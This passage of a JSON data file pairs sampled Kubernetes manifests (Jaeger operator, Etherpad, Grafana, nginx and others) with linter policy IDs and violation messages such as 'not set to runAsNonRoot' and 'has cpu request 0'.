name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: jaeger-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jaeger-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "2593",
    "manifest_path": "data/manifests/the_stack_sample/sample_0697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jaeger-operator\n  labels:\n    app: jaeger-operator-app\n  namespace: K8s-Tracing-Namespace\n  annotations:\n    developer/name: \"Mislav Jak\\u0161i\\u0107\"\n    developer/email: jaksicmislav@gmail.com\n    developer/url: https://github.com/MislavJaksic\n    developer/role: technical lead\n    developer/timezone: Europe/Zagreb\n    developer/picUrl: https://images.app.goo.gl/PCHZgd8oattge1i96\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: jaeger-operator\n  template:\n    metadata:\n      labels:\n        name: jaeger-operator\n    spec:\n      serviceAccountName: jaeger-operator\n      containers:\n      - name: jaeger-operator\n        image: jaegertracing/jaeger-operator:1.16.0\n        ports:\n        - containerPort: 8383\n          name: metrics\n        args:\n        - start\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: jaeger-operator\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jaeger-operator\" has cpu request 0"
  },
  {
    "id": "2594",
    "manifest_path": "data/manifests/the_stack_sample/sample_0697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jaeger-operator\n  labels:\n    app: jaeger-operator-app\n  namespace: K8s-Tracing-Namespace\n  annotations:\n    developer/name: \"Mislav Jak\\u0161i\\u0107\"\n    developer/email: jaksicmislav@gmail.com\n    developer/url: https://github.com/MislavJaksic\n    developer/role: technical lead\n    developer/timezone: Europe/Zagreb\n    developer/picUrl: https://images.app.goo.gl/PCHZgd8oattge1i96\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: jaeger-operator\n  template:\n    metadata:\n      labels:\n        name: jaeger-operator\n    spec:\n      serviceAccountName: jaeger-operator\n      containers:\n      - name: jaeger-operator\n        image: jaegertracing/jaeger-operator:1.16.0\n        ports:\n        - containerPort: 8383\n          name: metrics\n        args:\n        - start\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: jaeger-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jaeger-operator\" has memory limit 0"
  },
  {
    "id": "2595",
    "manifest_path": "data/manifests/the_stack_sample/sample_0700.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-evictor\n  namespace: bad-tenant\nspec:\n  containers:\n  - name: high-priority\n    image: nginxdemos/hello\n    resources:\n      requests:\n        cpu: 1\n        memory: 128Mi\n      limits:\n        cpu: 1\n        memory: 128Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"high-priority\" is using an invalid container image, \"nginxdemos/hello\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2596",
    "manifest_path": "data/manifests/the_stack_sample/sample_0700.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-evictor\n  namespace: bad-tenant\nspec:\n  containers:\n  - name: high-priority\n    image: nginxdemos/hello\n    resources:\n      requests:\n        cpu: 1\n        memory: 128Mi\n      limits:\n        cpu: 1\n        memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"high-priority\" does not have a read-only root file system"
  },
  {
    "id": "2597",
    "manifest_path": "data/manifests/the_stack_sample/sample_0700.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-evictor\n  namespace: bad-tenant\nspec:\n  containers:\n  - name: high-priority\n    image: nginxdemos/hello\n    resources:\n      requests:\n        cpu: 1\n        memory: 128Mi\n      limits:\n        cpu: 1\n        memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"high-priority\" is not set to runAsNonRoot"
  },
  {
    "id": "2598",
    "manifest_path": "data/manifests/the_stack_sample/sample_0703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: etherpad-lite\n  labels:\n    service: etherpad-lite\nspec:\n  selector:\n    matchLabels:\n      service: etherpad-lite\n  template:\n    metadata:\n      labels:\n        service: etherpad-lite\n    spec:\n      containers:\n      - name: etherpad-lite\n        image: etherpad/etherpad:1.8.6\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: SKIN_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: skin\n        - name: NODE_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: env\n        - name: DB_TYPE\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_type\n        - name: DB_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_host\n        - name: DB_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_port\n        - name: DB_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_name\n        - name: DB_USER\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_user\n        - name: DB_CHARSET\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_charset\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: port\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: ether-secret\n              key: db_password\n        - name: ADMIN_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: ether-secret\n              key: admin_password\n        ports:\n        - containerPort: 9001\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /opt/etherpad-lite/var\n          name: data-volume\n      volumes:\n      - name: data-volume\n        persistentVolumeClaim:\n          claimName: ether-data-vol\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"etherpad-lite\" does not have a read-only root file system"
  },
  {
    "id": "2599",
    "manifest_path": "data/manifests/the_stack_sample/sample_0703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: etherpad-lite\n  labels:\n    service: etherpad-lite\nspec:\n  selector:\n    matchLabels:\n      service: etherpad-lite\n  template:\n    metadata:\n      labels:\n        service: etherpad-lite\n    spec:\n      containers:\n      - name: etherpad-lite\n        image: etherpad/etherpad:1.8.6\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: SKIN_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: skin\n        - name: NODE_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: env\n        - name: DB_TYPE\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_type\n        - name: DB_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_host\n        - name: DB_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_port\n        - name: DB_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_name\n        - name: DB_USER\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_user\n        - name: DB_CHARSET\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_charset\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: port\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: ether-secret\n              key: db_password\n        - name: ADMIN_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: ether-secret\n              key: admin_password\n        ports:\n        - containerPort: 9001\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /opt/etherpad-lite/var\n          name: data-volume\n      volumes:\n      - name: data-volume\n        persistentVolumeClaim:\n          claimName: ether-data-vol\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"etherpad-lite\" is not set to runAsNonRoot"
  },
  {
    "id": "2600",
    "manifest_path": "data/manifests/the_stack_sample/sample_0703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: etherpad-lite\n  labels:\n    service: etherpad-lite\nspec:\n  selector:\n    matchLabels:\n      service: etherpad-lite\n  template:\n    metadata:\n      labels:\n        service: etherpad-lite\n    spec:\n      containers:\n      - name: etherpad-lite\n        image: etherpad/etherpad:1.8.6\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: SKIN_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: skin\n        - name: NODE_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: env\n        - name: DB_TYPE\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_type\n        - name: DB_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_host\n        - name: DB_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_port\n        - name: DB_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_name\n        - name: DB_USER\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_user\n        - name: DB_CHARSET\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_charset\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: port\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: ether-secret\n              key: db_password\n        - name: ADMIN_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: ether-secret\n              key: admin_password\n        ports:\n        - containerPort: 9001\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /opt/etherpad-lite/var\n          name: data-volume\n      volumes:\n      - name: data-volume\n        persistentVolumeClaim:\n          claimName: ether-data-vol\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"etherpad-lite\" has cpu request 0"
  },
  {
    "id": "2601",
    "manifest_path": "data/manifests/the_stack_sample/sample_0703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: etherpad-lite\n  labels:\n    service: etherpad-lite\nspec:\n  selector:\n    matchLabels:\n      service: etherpad-lite\n  template:\n    metadata:\n      labels:\n        service: etherpad-lite\n    spec:\n      containers:\n      - name: etherpad-lite\n        image: etherpad/etherpad:1.8.6\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: SKIN_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: skin\n        - name: NODE_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: env\n        - name: DB_TYPE\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_type\n        - name: DB_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_host\n        - name: DB_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_port\n        - name: DB_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_name\n        - name: DB_USER\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_user\n        - name: DB_CHARSET\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: db_charset\n        - name: PORT\n          valueFrom:\n            configMapKeyRef:\n              name: ether-config\n              key: port\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: ether-secret\n              key: db_password\n        - name: ADMIN_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: ether-secret\n              key: admin_password\n        ports:\n        - containerPort: 9001\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - mountPath: /opt/etherpad-lite/var\n          name: data-volume\n      volumes:\n      - name: data-volume\n        persistentVolumeClaim:\n          claimName: ether-data-vol\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"etherpad-lite\" has memory limit 0"
  },
  {
    "id": "2602",
    "manifest_path": "data/manifests/the_stack_sample/sample_0706.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secret-test-pod\nspec:\n  containers:\n  - name: test-container\n    image: gcr.io/google_containers/mounttest:0.8\n    command:\n    - /mt\n    - --file_content=/etc/secret-volume/data-1\n    volumeMounts:\n    - name: secret-volume\n      mountPath: /etc/secret-volume\n  volumes:\n  - name: secret-volume\n    secret:\n      secretName: test-secret\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test-container\" does not have a read-only root file system"
  },
  {
    "id": "2603",
    "manifest_path": "data/manifests/the_stack_sample/sample_0706.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secret-test-pod\nspec:\n  containers:\n  - name: test-container\n    image: gcr.io/google_containers/mounttest:0.8\n    command:\n    - /mt\n    - --file_content=/etc/secret-volume/data-1\n    volumeMounts:\n    - name: secret-volume\n      mountPath: /etc/secret-volume\n  volumes:\n  - name: secret-volume\n    secret:\n      secretName: test-secret\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test-container\" is not set to runAsNonRoot"
  },
  {
    "id": "2604",
    "manifest_path": "data/manifests/the_stack_sample/sample_0706.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secret-test-pod\nspec:\n  containers:\n  - name: test-container\n    image: gcr.io/google_containers/mounttest:0.8\n    command:\n    - /mt\n    - --file_content=/etc/secret-volume/data-1\n    volumeMounts:\n    - name: secret-volume\n      mountPath: /etc/secret-volume\n  volumes:\n  - name: secret-volume\n    secret:\n      secretName: test-secret\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"test-container\" has cpu request 0"
  },
  {
    "id": "2605",
    "manifest_path": "data/manifests/the_stack_sample/sample_0706.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secret-test-pod\nspec:\n  containers:\n  - name: test-container\n    image: gcr.io/google_containers/mounttest:0.8\n    command:\n    - /mt\n    - --file_content=/etc/secret-volume/data-1\n    volumeMounts:\n    - name: secret-volume\n      mountPath: /etc/secret-volume\n  volumes:\n  - name: secret-volume\n    secret:\n      secretName: test-secret\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"test-container\" has memory limit 0"
  },
  {
    "id": "2606",
    "manifest_path": "data/manifests/the_stack_sample/sample_0710.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      name: grafana\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - name: grafana\n        image: grafana/grafana:latest\n        ports:\n        - name: grafana\n          containerPort: 3000\n        volumeMounts:\n        - mountPath: /var/lib/grafana\n          name: grafana-storage\n        - mountPath: /etc/grafana/provisioning/datasources\n          name: grafana-datasources\n          readOnly: false\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: pvc-nfs-storage\n      - name: grafana-datasources\n        configMap:\n          defaultMode: 420\n          name: grafana-datasources\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"grafana\" is using an invalid container image, \"grafana/grafana:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2607",
    "manifest_path": "data/manifests/the_stack_sample/sample_0710.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      name: grafana\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - name: grafana\n        image: grafana/grafana:latest\n        ports:\n        - name: grafana\n          containerPort: 3000\n        volumeMounts:\n        - mountPath: /var/lib/grafana\n          name: grafana-storage\n        - mountPath: /etc/grafana/provisioning/datasources\n          name: grafana-datasources\n          readOnly: false\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: pvc-nfs-storage\n      - name: grafana-datasources\n        configMap:\n          defaultMode: 420\n          name: grafana-datasources\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"grafana\" does not have a read-only root file system"
  },
  {
    "id": "2608",
    "manifest_path": "data/manifests/the_stack_sample/sample_0710.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      name: grafana\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - name: grafana\n        image: grafana/grafana:latest\n        ports:\n        - name: grafana\n          containerPort: 3000\n        volumeMounts:\n        - mountPath: /var/lib/grafana\n          name: grafana-storage\n        - mountPath: /etc/grafana/provisioning/datasources\n          name: grafana-datasources\n          readOnly: false\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: pvc-nfs-storage\n      - name: grafana-datasources\n        configMap:\n          defaultMode: 420\n          name: grafana-datasources\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"grafana\" is not set to runAsNonRoot"
  },
  {
    "id": "2609",
    "manifest_path": "data/manifests/the_stack_sample/sample_0710.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      name: grafana\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - name: grafana\n        image: grafana/grafana:latest\n        ports:\n        - name: grafana\n          containerPort: 3000\n        volumeMounts:\n        - mountPath: /var/lib/grafana\n          name: grafana-storage\n        - mountPath: /etc/grafana/provisioning/datasources\n          name: grafana-datasources\n          readOnly: false\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: pvc-nfs-storage\n      - name: grafana-datasources\n        configMap:\n          defaultMode: 420\n          name: grafana-datasources\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"grafana\" has cpu request 0"
  },
  {
    "id": "2610",
    "manifest_path": "data/manifests/the_stack_sample/sample_0710.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: grafana\n  template:\n    metadata:\n      name: grafana\n      labels:\n        app: grafana\n    spec:\n      containers:\n      - name: grafana\n        image: grafana/grafana:latest\n        ports:\n        - name: grafana\n          containerPort: 3000\n        volumeMounts:\n        - mountPath: /var/lib/grafana\n          name: grafana-storage\n        - mountPath: /etc/grafana/provisioning/datasources\n          name: grafana-datasources\n          readOnly: false\n      volumes:\n      - name: grafana-storage\n        persistentVolumeClaim:\n          claimName: pvc-nfs-storage\n      - name: grafana-datasources\n        configMap:\n          defaultMode: 420\n          name: grafana-datasources\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"grafana\" has memory limit 0"
  },
  {
    "id": "2611",
    "manifest_path": "data/manifests/the_stack_sample/sample_0713.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1210\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2612",
    "manifest_path": "data/manifests/the_stack_sample/sample_0713.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1210\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2613",
    "manifest_path": "data/manifests/the_stack_sample/sample_0713.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1210\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2614",
    "manifest_path": "data/manifests/the_stack_sample/sample_0713.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1210\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2615",
    "manifest_path": "data/manifests/the_stack_sample/sample_0713.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1210\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2616",
    "manifest_path": "data/manifests/the_stack_sample/sample_0714.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2617",
    "manifest_path": "data/manifests/the_stack_sample/sample_0714.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2618",
    "manifest_path": "data/manifests/the_stack_sample/sample_0714.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2619",
    "manifest_path": "data/manifests/the_stack_sample/sample_0714.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2620",
    "manifest_path": "data/manifests/the_stack_sample/sample_0714.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2621",
    "manifest_path": "data/manifests/the_stack_sample/sample_0716.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: frontend\n  namespace: web\nspec:\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    app: frontend\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:frontend])"
  },
  {
    "id": "2622",
    "manifest_path": "data/manifests/the_stack_sample/sample_0720.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: contoso-website\nspec:\n  selector:\n    matchLabels:\n      app: contoso-website\n  template:\n    metadata:\n      labels:\n        app: contoso-website\n    spec:\n      containers:\n      - image: acrgh12949.azurecr.io/contoso-website\n        name: contoso-website\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 250m\n            memory: 256Mi\n        ports:\n        - containerPort: 80\n          name: http\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"contoso-website\" is using an invalid container image, \"acrgh12949.azurecr.io/contoso-website\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2623",
    "manifest_path": "data/manifests/the_stack_sample/sample_0720.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: contoso-website\nspec:\n  selector:\n    matchLabels:\n      app: contoso-website\n  template:\n    metadata:\n      labels:\n        app: contoso-website\n    spec:\n      containers:\n      - image: acrgh12949.azurecr.io/contoso-website\n        name: contoso-website\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 250m\n            memory: 256Mi\n        ports:\n        - containerPort: 80\n          name: http\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"contoso-website\" does not have a read-only root file system"
  },
  {
    "id": "2624",
    "manifest_path": "data/manifests/the_stack_sample/sample_0720.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: contoso-website\nspec:\n  selector:\n    matchLabels:\n      app: contoso-website\n  template:\n    metadata:\n      labels:\n        app: contoso-website\n    spec:\n      containers:\n      - image: acrgh12949.azurecr.io/contoso-website\n        name: contoso-website\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 250m\n            memory: 256Mi\n        ports:\n        - containerPort: 80\n          name: http\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"contoso-website\" is not set to runAsNonRoot"
  },
  {
    "id": "2625",
    "manifest_path": "data/manifests/the_stack_sample/sample_0721.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210616-1938066492\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"needs-rebase\" does not have a read-only root file system"
  },
  {
    "id": "2626",
    "manifest_path": "data/manifests/the_stack_sample/sample_0721.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210616-1938066492\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"needs-rebase\" is not set to runAsNonRoot"
  },
  {
    "id": "2627",
    "manifest_path": "data/manifests/the_stack_sample/sample_0721.yaml",
